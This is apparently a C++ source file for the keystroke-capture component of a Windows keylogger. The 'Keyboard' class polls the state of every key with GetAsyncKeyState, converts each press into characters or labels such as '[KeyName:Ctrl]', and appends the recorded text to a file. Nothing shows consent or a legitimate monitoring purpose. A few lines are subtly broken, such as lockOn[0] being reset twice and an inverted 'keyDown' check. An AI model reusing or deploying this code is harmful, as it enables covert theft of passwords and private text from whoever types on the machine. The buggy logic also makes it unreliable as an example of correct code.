#include "stdafx.h"
#include "Keyboard.h"

#include <string>
#include <iostream>
#include <iomanip>
#include <fstream>
#include <windows.h>

Keyboard::Keyboard()
	: IRecorder()
{
	lockOn[0] = false;
	lockOn[1] = false;
	capital = false;
	specialKeys[VK_OEM_1] = "[KeyName:colon]";
	specialKeys[VK_OEM_5] = "[KeyName:pipe]";
	specialKeys[VK_RCONTROL] = "[KeyName:Ctrl]";
	specialKeys[VK_LCONTROL] = "[KeyName:Ctrl]";
	specialKeys[VK_CONTROL] = "[KeyName:Ctrl]";
	specialKeys[VK_MENU] = "[KeyName:Alt]";
	specialKeys[VK_RMENU] = "[KeyName:Alt]";
	specialKeys[VK_LMENU] = "[KeyName:Alt]";
	specialKeys[VK_DELETE] = "[KeyName:Delete]";
	specialKeys[VK_LWIN] = "[KeyName:Windows]";
	specialKeys[VK_RWIN] = "[KeyName:Windows]";
	specialKeys[VK_NUMLOCK] = "[KeyName:NumLock]";
	specialKeys[VK_SCROLL] = "[KeyName:Scroll]";
	specialKeys[VK_INSERT] = "[KeyName:Insert]";
	specialKeys[VK_HELP] = "[KeyName:Help]";
	specialKeys[VK_PAUSE] = "[KeyName:Pause]";
	specialKeys[VK_RETURN] = "[KeyName:Return]";
	specialKeys[VK_CLEAR] = "[KeyName:Clear]";
	specialKeys[VK_TAB] = "[KeyName:Tab]";
	specialKeys[VK_BACK] = "[KeyName:Backspace]";
	specialKeys[VK_PRIOR] = "[KeyName:PageUp]";
	specialKeys[VK_NEXT] = "[KeyName:PageDown]";
	specialKeys[VK_END] = "[KeyName:End]";
	specialKeys[VK_HOME] = "[KeyName:Home]";
	specialKeys[VK_LEFT] = "[KeyName:Left]";
	specialKeys[VK_UP] = "[KeyName:Up]";
	specialKeys[VK_RIGHT] = "[KeyName:Right]";
	specialKeys[VK_DOWN] = "[KeyName:Down]";
	specialKeys[VK_SELECT] = "[KeyName:Select]";
	specialKeys[VK_PRINT] = "[KeyName:Print]";
	specialKeys[VK_EXECUTE] = "[KeyName:Execute]";
	specialKeys[VK_SNAPSHOT] = "[KeyName:SnapShot]";
	specialKeys[VK_APPS] = "[KeyName:Apps]";

	specialKeys[VK_F1] = "[KeyName:F1]";
	specialKeys[VK_F2] = "[KeyName:F2]";
	specialKeys[VK_F3] = "[KeyName:F3]";
	specialKeys[VK_F4] = "[KeyName:F4]";
	specialKeys[VK_F5] = "[KeyName:F5]";
	specialKeys[VK_F6] = "[KeyName:F6]";
	specialKeys[VK_F7] = "[KeyName:F7]";
	specialKeys[VK_F8] = "[KeyName:F8]";
	specialKeys[VK_F9] = "[KeyName:F9]";
	specialKeys[VK_F10] = "[KeyName:F10]";
	specialKeys[VK_F11] = "[KeyName:F11]";
	specialKeys[VK_F12] = "[KeyName:F12]";
	specialKeys[VK_F13] = "[KeyName:F13]";
	specialKeys[VK_F14] = "[KeyName:F14]";
	specialKeys[VK_F15] = "[KeyName:F15]";
	specialKeys[VK_F16] = "[KeyName:F16]";
	specialKeys[VK_F17] = "[KeyName:F17]";
	specialKeys[VK_F18] = "[KeyName:F18]";
	specialKeys[VK_F19] = "[KeyName:F19]";
	specialKeys[VK_F20] = "[KeyName:F20]";
	specialKeys[VK_F21] = "[KeyName:F21]";
	specialKeys[VK_F22] = "[KeyName:F22]";
	specialKeys[VK_F23] = "[KeyName:F23]";
	specialKeys[VK_F24] = "[KeyName:F24]";
}

Keyboard::~Keyboard()
{

}

void				Keyboard::getMajState(unsigned char * keyState) const
{
	if (lockOn[0] == true || capital == true)
		keyState[VK_CAPITAL] = 1;
}

void				Keyboard::shiftLock()
{
	lockOn[0] = true;
}

void				Keyboard::capitalLock()
{
	if (capital == true)
		capital = false;
	else
		capital = true;
}

void			Keyboard::allUnlock()
{
	lockOn[0] = false;
	lockOn[0] = false;
}

void			Keyboard::checkCapital(unsigned int ascii)
{
	if (ascii == VK_SHIFT || ascii == VK_LSHIFT || ascii == VK_RSHIFT)
		this->shiftLock();
	else
	{
		if (lockOn[0] == true)
		{
			if (lockOn[1] == false)
				lockOn[1] = true;
			else
			{
				lockOn[0] = false;
				lockOn[0] = false;
			}
		}
	}
}

const std::string 		Keyboard::manageKeys(unsigned int ascii)
{
	BYTE				keyState[256] = { 0 };
	HKL					keyLayout;
	std::string			key;
	unsigned int		scancode;
	char				buffer[256];

	keyLayout = GetKeyboardLayout(0);
	if (ascii == VK_SHIFT || ascii == VK_LSHIFT || ascii == VK_RSHIFT)
		this->shiftLock();
	else if (ascii == VK_CAPITAL)
		this->capitalLock();
	else
	{
		scancode = MapVirtualKey(ascii, MAPVK_VK_TO_VSC);
		GetKeyboardState(keyState);
		this->getMajState(keyState);
		if (specialKeys.count(ascii))
			key = specialKeys[ascii];
		else if (ToAsciiEx(ascii, scancode, keyState, (LPWORD)buffer, 0, keyLayout) != 0)
		{
			key = buffer;
			key = key.at(0);
		}
	}
	return (key);
}

const std::string 		Keyboard::readKey()
{
	std::string			key;
	bool				keyDown = false;
	SHORT				res;

	for (int ascii = 8; ascii <= 254; ascii++)
	{
		if ((res = GetAsyncKeyState(ascii)) < 0)
		{
			keyDown = true;
			if (res == -32767)
				key = this->manageKeys(ascii);
			else
				this->checkCapital(ascii);
		}
	}
	if (!keyDown == false)
		this->allUnlock();
	return (key);
}

void				Keyboard::read()
{
	std::string		key;

	key = this->readKey();
	if (!key.empty())
	{
		record += key;
	}
}

void				Keyboard::write(const std::string & filename)
{
	std::fstream	fs;

	fs.open(filename, std::fstream::out | std::fstream::app);
	fs << record;
	fs.close();
	record.clear();
	record = "";
}